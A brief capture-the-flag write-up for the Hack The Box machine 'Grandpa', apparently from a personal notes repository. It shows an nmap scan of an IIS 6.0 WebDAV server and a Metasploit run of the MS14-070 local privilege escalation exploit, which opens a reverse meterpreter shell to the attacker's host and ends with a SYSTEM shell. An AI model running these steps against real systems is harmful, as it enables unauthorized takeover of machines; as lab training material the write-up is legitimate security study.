## Grandpa

__Machine IP : 10.10.10.14__
Difficulty: Easy


## Scanning
### Nmap Scanning

```bash
$ cat nmap/initial.nmap 
# Nmap 7.91 scan initiated Fri Aug 20 16:00:29 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up (0.095s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Fri, 20 Aug 2021 20:04:05 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 20 16:00:48 2021 -- 1 IP address (1 host up) scanned in 19.03 seconds
```
 ----- Same as Granny-------


### Post exploitation-- 
 ```bash
 
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2


msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun2
lhost => tun2
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lport 5555
lport => 5555
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > eun
[-] Unknown command: eun.
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.10.14.7:5555 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.7:5555 -> 10.10.10.14:1031) at 2021-08-28 13:42:22 -0400

meterpreter > shell\
 > 
Process 3856 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>cd ..
cd ..

C:\WINDOWS>whoami
whoami
nt authority\system
```